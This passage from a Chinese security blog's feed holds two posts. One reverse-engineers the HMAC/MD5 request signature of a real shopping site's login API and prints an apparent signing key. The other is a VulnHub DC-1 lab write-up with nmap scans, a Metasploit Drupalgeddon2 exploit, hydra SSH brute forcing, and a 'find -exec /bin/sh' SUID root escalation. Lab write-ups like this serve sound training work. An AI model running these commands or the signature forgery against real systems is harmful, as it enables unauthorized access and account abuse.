alt=""></p><p>现在，我们开始分析，HMAC算法可以使用Python第三方库实现，先尝试一下。加密内容有了，密钥也有了（加密目标值可以用<code>JSON.stringify()</code>提取）<br>加密目标值：“01\nPOST\nb7da15fd7cdc2b8c73958ee82e7424aa\n/mroute.html?method=beibei.user.token.get\n1591002077”<br>密钥：“ytU7vwqIx2UXQNsi”</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601190441.png" alt=""></p><p>Python测试效果如下</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191001.png" alt=""></p><p>但是发现，与<code>_abr</code>的值相较，少了一些内容，回过头观察，发现<code>_abr</code>的值由<code>a+m+h</code>组成，<code>a</code>经测试是固定值<code>01</code>，<code>m</code>就是经过HMAC加密后的值，<code>h</code>会变动且暂时还不清楚</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191307.png" alt=""></p><p>对<code>h</code>进行分析，发现是由<code>s</code>的值使用<code>toString(16)</code>函数变化而来，而<code>s</code>则是时间戳(<code>new Date</code>)变化而来</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191707.png" alt=""></p><p>提取出<code>h</code>的算法，测试了一下，成功</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601194144.png" alt=""></p><p>接下来，只剩下需要加密的值，它如何产生的，观察发现由<code>a + &quot;\n&quot; + e + &quot;\n&quot; + f + &quot;\n&quot; + p + &quot;\n&quot; + s</code>组成，<code>a</code>、<code>s</code>都清楚了，<code>e</code>发现是<code>POST</code>，<code>p</code>是路径<code>/mroute.html?method=beibei.h5.login</code>，这两个也是固定值，只剩下<code>f</code>是MD5加密后的值，逆向<code>f</code>的产生过程，发现是由&quot;用户名+路径+登陆id&quot;产生而来，如：<code>username=12341234123&amp;scene=h5_login&amp;rams_device_id=2654748010</code><br>所以现在只需要将这个值MD5加密后传入即可，同样也能用Python实现</p><p>最终完成的效果<br><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601195839.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;谷歌学术镜像&quot;&gt;谷歌学术镜像&lt;/h3&gt;
&lt;p&gt;目标网址：&lt;a href=&quot;https://ac.scmor.com/&quot;&gt;https://ac.scmor.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent
      
    
    </summary>
    
    
      <category term="JS逆向" scheme="http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"/>
    
    
      <category term="JS逆向系列" scheme="http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub渗透之DC-1</title>
    <link href="http://yoursite.com/2020/05/25/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-1/"/>
    <id>http://yoursite.com/2020/05/25/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-1/</id>
    <published>2020-05-25T04:57:51.000Z</published>
    <updated>2020-05-25T04:57:51.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0×00-说明">0×00 说明</h2><blockquote><p>kali与目标处于同一网段下<br>攻击机：Kali(VMware ) IP:192.168.1.31</p></blockquote><p>特别说明：每个靶机作者都对靶机做了详细的描述以及攻击目标，比如DC1就需要找到5个flag，最终目标是在root的主目录中找到并读取该标志！</p><p>通过每个flag所获得知识点</p><p>1、msf的熟练使用以及搜索可利用漏洞（Drupal）；</p><p>2、留意目标网站的配置文件（慢慢查看别错过重要信息）；</p><p>3、数据库管理员提权（更新管理员密码或者添加一个新用户）；</p><p>4、suid提权的命令（nmap、vim、find、bash、more、less、nano、cp）。</p><h2 id="0×01-信息收集">0×01 信息收集</h2><h3 id="探测目标IP">探测目标IP</h3><p>namp -sP 192.168.1.0/24<br>arp-scan -l//扫描当前网段下的IP<br>Cadmus Computer Systems 表示Virtualbox虚拟机<br>分析得出目标IP为192.168.1.30</p><blockquote><p>靶机：DC-1(Virtualbox) IP:192.168.1.30</p></blockquote><h3 id="扫描端口">扫描端口</h3><p>nmap -sV -p- 192.168.1.30//扫描全端口<br>-sV 用来扫描目标主机和端口上运行的软件的版本<br>-p- 扫描0-65535全部端口</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524190438.png" alt=""></p><p>80端口开放，访问一下</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524191012.png" alt=""></p><p>Wappalyzer进行网站指纹识别，查看到是Drupal 7</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524191337.png" alt=""></p><p>查看一下robots.txt文件已经目录扫描(省略)。。发现没有可利用的地方</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524192628.png" alt=""></p><h2 id="0×02metasploit">0×02metasploit</h2><p>直接上metasploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@sf:~# msfconsole</span><br><span class="line">msf &gt; search Drupal</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524201135.png" alt=""></p><p>选择4，drupalgeddon2的exp，设置下rhost，直接exploit，成功</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524212454.png" alt=""></p><p>接下来使用msf自带的shell</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213300.png" alt=""></p><h3 id="发现flag1">发现flag1</h3><p>查看当前路径下的文件，发现<code>flag1.txt</code>文件，查看一下，发现提示CMS配置文件有猫腻</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213406.png" alt=""></p><h3 id="发现flag2">发现flag2</h3><p>网上搜索得知，Drupal 7的默认配置文件为<code>sites/default/settings.php</code>，查看发现flag2，还有数据库连接信息</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524213927.png" alt=""></p><h2 id="0×003-弯路">0×003 弯路</h2><p>尝试连接数据库，结果连接失败，应该是权限不足</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214247.png" alt=""></p><h3 id="爆破flag4用户密码">爆破flag4用户密码</h3><p>于是去查看<code>/etc/passwd</code>文件，发现flag4用户</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214358.png" alt=""></p><p>使用hydra尝试爆破flag4用户的密码，<code>hydra -l flag4 -P /usr/share/john/password.lst ssh://192.168.1.30</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524214646.png" alt=""></p><p>成功爆破flag4的密码，为 orange ，接下来ssh登录flag4用户，查看当前路径下有<code>flag4.txt</code>，得到新的提示——root目录里有个flag</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215013.png" alt=""></p><h2 id="0×04-连接数据库">0×04 连接数据库</h2><p>然后我们连接数据库，这次成功</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215205.png" alt=""></p><p>顺藤摸瓜，仔细查找数据库</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215355.png" alt=""></p><p>查看user表，发现admin用户</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215445.png" alt=""></p><p>查看role表</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215512.png" alt=""></p><p>查看role_permission表</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215644.png" alt=""></p><p>查看node表</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524215712.png" alt=""></p><h3 id="发现flag3">发现flag3</h3><p>发现flag3，得知uid为1的用户是不受Drupal权限管制的，具有最高权限，uid 1用户也就是admin，</p><h2 id="0×05-两个思路">0×05 两个思路</h2><h3 id="一、重置管理员密码">一、重置管理员密码</h3><p>使用Drupal对数据库的加密方法，加密脚本位置在网站根目录下的script下(msf shell)，使用脚本生成加密密文，然后登陆数据库修改admin的密码</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222511.png" alt=""></p><p>修改密码为123456</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222543.png" alt=""></p><p>成功登陆</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524222616.png" alt=""></p><h3 id="二、添加一个管理员权限的用户">二、添加一个管理员权限的用户</h3><p>先查看一下靶机的版本，7.24</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232222.png" alt=""></p><p>msf搜索Druapl 7.24对应可利用的脚本，发现一个符合</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232538.png" alt=""></p><p>运行脚本，进行利用</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524232830.png" alt=""></p><p>增加了一个用户user，密码为123456，尝试登陆网站，发现登陆成功</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524233018.png" alt=""></p><h3 id="发现flag3-2">发现flag3</h3><p>从网站上找到了flag3的界面，得到提示<code>Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.</code>，重点在（FIND the passwd、need to -exec that command、in the shadow）</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524223823.png" alt=""></p><p>根据线索，我们又找到了flag4以及它的目录，再根据flag4的提示，（用相同的方法在root目录下）找到最终flag</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524224339.png" alt=""></p><h2 id="0×06-提权">0×06 提权</h2><p>于是，想到suid提权，查询具有root权限的命令，以下均可查询：</p><ul><li>find / -user root -perm -4000 -print 2&gt;/dev/null</li><li>find / -perm -u=s -type f 2&gt;/dev/null</li><li>find / -user root -perm -4000 -exec ls -ldb { }<br>注： -type f即文件，-perm -u=s 即user权限位为suid</li></ul><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230257.png" alt=""></p><p>发现<code>find</code>命令本身就是root权限</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230453.png" alt=""></p><p>于是就用<code>find</code>提权，<code>find ./ aaa -exec '/bin/sh' \\;</code> ，或者新建一个文件，验证一下，已经是root了</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524230955.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231608.png" alt=""></p><h3 id="最终flag">最终flag</h3><p>接着找到根目录下的root目录，里面就是最终的flag</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231307.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524231720.png" alt=""></p><h2 id="0×07-总结">0×07 总结</h2><p>DC-1找到最终的flag并不难，难在找齐五个flag，第一次实验，很生疏，存在很多问题：</p><ul><li><p>metasploit 熟练度不足，且exploit模块成功后的shell不是交互性，DC-1安装了python环境，可以通过pty.spawn()获得交互性shell</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200524235827.png" alt=""></p></li><li><p>exploitdb熟练度也不足</p></li><li><p>Linux熟练度不足，find命令，有待学习</p></li><li><p>suid提权的命令（nmap、vim、find、bash、more、less、nano、cp），有待学习</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0×00-说明&quot;&gt;0×00 说明&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;kali与目标处于同一网段下&lt;br&gt;
攻击机：Kali(VMware ) IP:192.168.1.31&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;特别说明：每个靶机作者都对靶机做了详细的
      
    
    </summary>
    
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="VulnHub" scheme="http://yoursite.com/tags/VulnHub/"/>
    
  </entry>
  
</feed>
